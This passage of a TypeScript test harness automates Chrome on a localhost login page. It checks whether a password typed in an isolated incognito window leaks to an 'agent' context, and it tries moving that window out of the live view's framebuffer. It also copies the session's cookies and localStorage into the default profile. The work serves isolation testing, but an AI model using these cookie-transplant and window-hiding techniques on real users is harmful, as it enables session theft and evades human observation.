    out.cases.K1_same_context = { agent_page_served_by_worker: served, agent_tab_got_the_typed_value_by_broadcastchannel: bc, agent_tab_got_it_by_storage_event: st, with_bypass_agent_page_served: servedBypass };
    await evaluate(c, listen.s, "window.__bc = []; window.__st = []; true");
  }

  // ---- the act, in its own incognito window: one function for the three variants
  async function act(variant: "old" | "main" | "flip") {
    const r: Record<string, any> = {};
    const t0 = Date.now();
    const win = await R(`chrome.windows.create({ incognito: true, url: 'about:blank', focused: false, left: 0, top: 0, width: 1200, height: 850 }).then((w) => ({ id: w.id, tab: w.tabs[0].id }), (e) => ({ error: String(e.message || e) }))`);
    if (win.error) return { error: win.error };
    const tab = win.tab;
    r.store_is_fresh = await R(`R.incognitoStore(${tab}).then((id) => chrome.cookies.getAll({ storeId: id, domain: 'login.localhost' })).then((a) => a.length === 0)`);
    await R(`R.att(${tab})`);
    for (const m of ["Page.enable", "Runtime.enable", "Network.enable"]) await R(`R.send(${tab}, ${J(m)})`);
    await R(`R.send(${tab}, 'Network.setBypassServiceWorker', { bypass: true })`);
    await R(`R.send(${tab}, 'Emulation.setFocusEmulationEnabled', { enabled: true })`);
    await R(`Object.assign(R.G, { on: true, tab: ${tab}, origin: ${J(ORIGIN)}, pw: ${J(P)}, blocked: [], continued: 0, paused: [], ws: [] })`);
    await R(`R.send(${tab}, 'Fetch.enable', { patterns: [{ urlPattern: '*', requestStage: 'Request' }] })`);
    const path = variant === "main" ? "/signin-act?v=main" : `/signin-act?v=${variant}`;
    await R(`R.go(${tab}, ${J(ORIGIN + path)})`);
    await sleep(800); // the page's worker registration
    r.agent_page_served = await R(`R.ev(${tab}, 'window.__agentPage === true')`);
    if (variant === "main") {
      // B1: what the act's context shares with the agent's default context
      r.isolation = await R(`R.ev(${tab}, "(async () => ({ agent_marker_visible: localStorage.getItem('agent_marker') !== null, agent_caches_visible: (await caches.keys()).length > 0, controlled_by_a_worker: !!navigator.serviceWorker.controller }))()")`);
      await R(`R.ev(${tab}, "new BroadcastChannel('x').postMessage('from-act'); localStorage.setItem('act_marker', 'from-act'); true")`);
      await sleep(400);
      r.isolation.default_tab_got_broadcast = await evaluate(c, listen.s, "window.__bc.includes('from-act')");
      r.isolation.default_tab_got_storage_event = await evaluate(c, listen.s, "window.__st.includes('from-act')");
      r.isolation.default_sees_act_marker = await evaluate(c, listen.s, "localStorage.getItem('act_marker') !== null");
      // B2: the window and the live view's framebuffer
      r.window = { fb_pixels_on_screen: fbCount() };
      const ids = xdo("search", "--name", "actwin").split("\n").filter((x) => /^\d+$/.test(x));
      r.window.x_windows_found = ids.length;
      const moved = await R(`chrome.windows.update(${win.id}, { left: ${SCREEN.w + 200}, top: 0 }).then((w) => ({ left: w.left, top: w.top }), (e) => ({ error: String(e.message || e) }))`);
      r.window.extension_update_offscreen = moved;
      const half = await R(`chrome.windows.update(${win.id}, { left: ${SCREEN.w - 500}, top: 0 }).then((w) => ({ left: w.left, top: w.top }), (e) => ({ error: String(e.message || e) }))`);
      r.window.extension_update_more_than_half_offscreen = half;
      // the reference: the browser-level CDP call that the receiver cannot send (the pipe can)
      const { targetInfos } = await c.send("Target.getTargets");
      const actTarget = targetInfos.find((x: any) => x.type === "page" && x.title === "actwin" && x.browserContextId !== targetInfos.find((y: any) => y.targetId === listen.targetId)?.browserContextId);
      r.window.act_target_in_another_browser_context = !!actTarget;
      if (actTarget) {
        const { windowId } = await c.send("Browser.getWindowForTarget", { targetId: actTarget.targetId });
        r.window.cdp_set_offscreen = await c.send("Browser.setWindowBounds", { windowId, bounds: { left: SCREEN.w + 200, top: 0 } }).then(async () => (await c.send("Browser.getWindowBounds", { windowId })).bounds, (e: Error) => ({ error: errText(e) }));
      }
      await sleep(800);
      r.window.fb_pixels_after_move = fbCount();
      const geo = ids.map((id) => xdo("getwindowgeometry", id).split("\n").find((l) => l.includes("Position")) ?? "").filter(Boolean);
      r.window.x_positions = geo.map((g) => g.replace(/^\s*Position:\s*/, "").replace(/\s*\(screen.*$/, ""));
      xdo("mousemove", String(SCREEN.w + 400), "100");
      r.window.pointer_after_move_beyond_screen = xdo("getmouselocation").replace(/ screen.*$/, "").replace(/ window.*$/, "");
      // the X level, with no browser-level CDP: back on the screen, then a minimized state, then outside the screen
      for (const id of ids) xdo("windowmove", id, "0", "0");
      await sleep(800);
      r.window.fb_pixels_back_on_screen_by_x = fbCount();
      r.window.extension_minimize = await R(`chrome.windows.update(${win.id}, { state: 'minimized' }).then((w) => w.state, (e) => 'error ' + String(e.message || e))`);
      await sleep(800);
      r.window.fb_pixels_minimized = fbCount();
      await R(`chrome.windows.update(${win.id}, { state: 'normal' }).catch(() => {})`); await sleep(800);
      for (const id of ids) xdo("windowmove", id, String(SCREEN.w + 200), "0");
      await sleep(800);
      r.window.fb_pixels_after_x_move_outside = fbCount();
      r.window.extension_sees_bounds_after_x_move = await R(`chrome.windows.get(${win.id}).then((w) => ({ left: w.left, top: w.top, state: w.state }))`);
    }
    // the type watch, in the act's isolated world
    const { frameTree } = await R(`R.send(${tab}, 'Page.getFrameTree')`);
    const { executionContextId: ctx } = await R(`R.send(${tab}, 'Page.createIsolatedWorld', { frameId: ${J(frameTree.frame.id)}, worldName: 'signin' })`);
    await R(`R.ev(${tab}, ${J("(() => { const p = document.querySelector('#p'); window.__typeChanged = false; new MutationObserver(() => { if (p.type !== 'password') { window.__typeChanged = true; p.value = ''; } }).observe(p, { attributes: true, attributeFilter: ['type'] }); return true; })()")}, ${ctx})`);
    if (variant === "flip") r.ws_seen_before_the_first_key = await R(`R.G.ws.slice()`);
    // B3: from the first key, the receiver's tab rules (main): every request of the act tab outside send_to, every
    // non-tab request (a service worker) of the site outside send_to; main-frame GETs stay for a redirect.
    if (variant === "main") {
      const ALL = ["sub_frame", "stylesheet", "script", "image", "font", "object", "xmlhttprequest", "ping", "csp_report", "media", "websocket", "webtransport", "webbundle", "other"];
      r.dnr = await R(`chrome.declarativeNetRequest.updateSessionRules({ addRules: [
        { id: 50, priority: 4, action: { type: 'block' }, condition: { tabIds: [${tab}], excludedRequestDomains: ['login.localhost'], resourceTypes: ${J(ALL)} } },
        { id: 51, priority: 4, action: { type: 'block' }, condition: { tabIds: [${tab}], excludedRequestDomains: ['login.localhost'], resourceTypes: ['main_frame'], excludedRequestMethods: ['get'] } },
        { id: 52, priority: 4, action: { type: 'block' }, condition: { tabIds: [-1], initiatorDomains: ['login.localhost'], excludedRequestDomains: ['login.localhost'], resourceTypes: ${J(ALL)} } } ] }).then(() => 'set', (e) => String(e.message || e))`);
    }
    await R(`R.click(${tab}, '#u', ${ctx})`); await R(`R.type(${tab}, ${J(U)})`);
    await R(`R.click(${tab}, '#p', ${ctx})`);
    const typed = await R(`R.type(${tab}, ${J(P)}, ${ctx})`);
    r.type_watch = { stopped: typed.stopped, typed: typed.typed, of: P.length };
    if (typed.stopped) {
      r.type_watch.field_empty = await R(`R.ev(${tab}, "document.querySelector('#p').value === ''", ${ctx})`);
    } else {
      await R(`R.click(${tab}, '#go', ${ctx})`);
      let state = "";
      for (let i = 0; i < 50 && state !== "signed in"; i++) { await sleep(100); state = await R(`R.ev(${tab}, "document.getElementById('note').textContent")`); }
      r.signed_in = state === "signed in";
    }
    await sleep(1200); // the page's channels
    if (variant === "main" && r.signed_in) {
      // the move: the act context's cookies of the site and its localStorage, read before the close
      const store = await R(`R.incognitoStore(${tab})`);
      const cookies = await R(`chrome.cookies.getAll({ storeId: ${J(store)}, domain: 'login.localhost' })`);
      const local = await R(`R.ev(${tab}, "JSON.stringify(Object.fromEntries(Object.entries(localStorage)))", ${ctx})`);
      r.move = { cookies: cookies.length, local_keys: Object.keys(JSON.parse(local)).length };
      globalThis.__move = { cookies, local };
      r.window.fb_pixels_offscreen_after_typing = fbCount();
      const ids = xdo("search", "--name", "actwin|Welcome").split("\n").filter((x) => /^\d+$/.test(x));
      for (const id of ids) xdo("windowmove", id, "0", "0");
      await sleep(800);
      r.window.fb_pixels_after_an_x_client_moves_it_back = fbCount();
    }
    // the clean end
    await R(`R.ev(${tab}, "for (const el of document.querySelectorAll('input')) el.value = ''; true", ${ctx})`).catch(() => {});
    r.reset_history = await R(`R.send(${tab}, 'Page.resetNavigationHistory').then(() => true, (e) => String(e.message || e))`);
    if (variant === "main") await R(`chrome.declarativeNetRequest.updateSessionRules({ removeRuleIds: [50, 51, 52] })`);
    await R(`R.send(${tab}, 'Fetch.disable')`).catch(() => {});
    r.guard = await R(`({ blocked: R.G.blocked.slice(), continued: R.G.continued, paused_websocket: R.G.paused.some((p) => p.type === 'WebSocket' || p.scheme === 'ws'), paused_hosts: [...new Set(R.G.paused.map((p) => p.host))] })`);
    await R(`R.G.on = false; R.det(${tab})`);
    await R(`chrome.windows.remove(${win.id})`);
    await sleep(800);
    r.cookie_stores_after_close = await R(`R.stores()`);
    r.ms = Date.now() - t0;
    return r;
  }

  const snap = () => JSON.parse(JSON.stringify(tracker));
  const diff = (a: Record<string, Chan>, b: Record<string, Chan>) => {
    const o: Record<string, Chan> = {};
    for (const k of Object.keys(b)) { const x = a[k] ?? { requests: 0, whole: 0, prefix: 0 }; o[k] = { requests: b[k].requests - x.requests, whole: b[k].whole - x.whole, prefix: b[k].prefix - x.prefix }; }
    return o;
  };
  for (const v of ["old", "main", "flip"] as const) {
    const before = snap();
    try { out.cases[`act_${v}`] = await act(v); } catch (e) { out.cases[`act_${v}`] = { error: errText(e) }; }
    out.cases[`act_${v}`].tracker = diff(before, snap());
    say(`act ${v} done`);
  }

  // ---- the import's stand-in: cookies into the default store (as C6 step 1), localStorage by a tab of the origin
  const mv = (globalThis as any).__move;
  if (mv) {
    const set = await R(`Promise.all(${J(mv.cookies)}.map((k) => chrome.cookies.set({ url: 'http://login.localhost:${PORT}' + k.path, name: k.name, value: k.value, path: k.path, httpOnly: k.httpOnly, secure: k.secure, sameSite: k.sameSite, storeId: '0', ...(k.session ? {} : { expirationDate: k.expirationDate }) }).then((x) => !!x)))`);
    const restore = await pageTab(c, `${ORIGIN}/blank`);
    await evaluate(c, restore.s, `(() => { const s = JSON.parse(${J(mv.local)}); for (const [k, v] of Object.entries(s)) localStorage.setItem(k, v); return true; })()`);
    await c.send("Target.closeTarget", { targetId: restore.targetId });
    await c.send("Page.navigate", { url: `${ORIGIN}/home` }, agentHome.s); await sleep(1000);
    const home = await evaluate(c, agentHome.s, "document.getElementById('state').textContent");
    await c.send("Page.navigate", { url: `${ORIGIN}/spa-home` }, agentHome.s); await sleep(1200);
    const spa = await evaluate(c, agentHome.s, "document.getElementById('state').textContent");
    out.cases.after_the_move = { cookies_set: set.filter(Boolean).length, agent_home: home, agent_spa_home_by_localstorage_token: spa };
  }
  out.cases.listener_after_acts = { got_any_value: await evaluate(c, listen.s, `window.__bc.concat(window.__st).some((v) => ${J([U, P])}.some((s) => v.includes(s)))`) };
} catch (e) {
  out.error = errText(e);
}
await c.close();
// ---- the default profile after the close: History, every file, the six preferences
const H = join(c.dir, "Default", "History");
out.cases.history = {
  rows_of_act_paths: sql(H, "select count(*) from urls where url like ?", "%signin-act%"),
  rows_with_username_title: sql(H, "select count(*) from urls where instr(title, ?) > 0", U),
  rows_of_agent_paths: sql(H, "select count(*) from urls where url like ?", "%/home"),
};
out.cases.profile_files = scan(c.dir);
try {
  const pf = JSON.parse(readFileSync(join(c.dir, "Default", "Preferences"), "utf8"));
  out.cases.preferences_kept = {
    credentials_enable_service: pf.credentials_enable_service, "profile.password_manager_enabled": pf.profile?.password_manager_enabled,
    "profile.password_manager_leak_detection": pf.profile?.password_manager_leak_detection, "autofill.enabled": pf.autofill?.enabled,
    "autofill.profile_enabled": pf.autofill?.profile_enabled, "autofill.credit_card_enabled": pf.autofill?.credit_card_enabled,
  };
} catch (e) { out.cases.preferences_kept = { error: errText(e) }; }
out.tracker_total = tracker;
writeFileSync(join(OUT, "results-round1.json"), JSON.stringify(out, null, 2) + "\n");
process.stdout.write(JSON.stringify(out, null, 2) + "\n");
server.close();
process.exit(0);
